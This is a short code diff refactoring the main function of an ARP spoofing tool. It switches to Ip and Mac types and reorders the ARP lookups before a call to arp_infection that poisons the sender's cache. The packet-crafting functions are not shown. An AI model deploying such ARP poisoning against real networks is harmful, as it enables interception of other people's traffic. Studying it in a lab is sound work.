@@ -17,15 +17,14 @@ int main(int argc, char *argv[])
 		return -1;
 	}
 
-	char *const a_ip = get_attacker_ip(dev);
-	char *const a_mac = get_attacker_mac(dev);
-
-	char *const s_mac = get_mac_by_arp(handle, a_mac, a_ip, argv[2], SENDER);
-	char *const t_mac = get_mac_by_arp(handle, a_mac, a_ip, argv[3], TARGET);
-
-	arp_infection(handle, s_mac, argv[2], argv[3], a_mac);
-
-	show_info(argv[2], s_mac, argv[3], t_mac, a_ip, a_mac);
-
+	Ip s_ip = Ip(argv[2]);
+	Ip t_ip = Ip(argv[3]);
+	Ip a_ip = get_attacker_ip(dev);
+	Mac a_mac = get_attacker_mac(dev);
+	Mac t_mac = resolve_mac_by_arp(handle, a_mac, a_ip, t_ip, TARGET);
+	Mac s_mac = resolve_mac_by_arp(handle, a_mac, a_ip, s_ip, SENDER);
+	
+	arp_infection(handle, s_mac, s_ip, t_ip, a_mac);
+	show_info(s_ip, s_mac, t_ip, t_mac, a_ip, a_mac);
 	pcap_close(handle);
 }
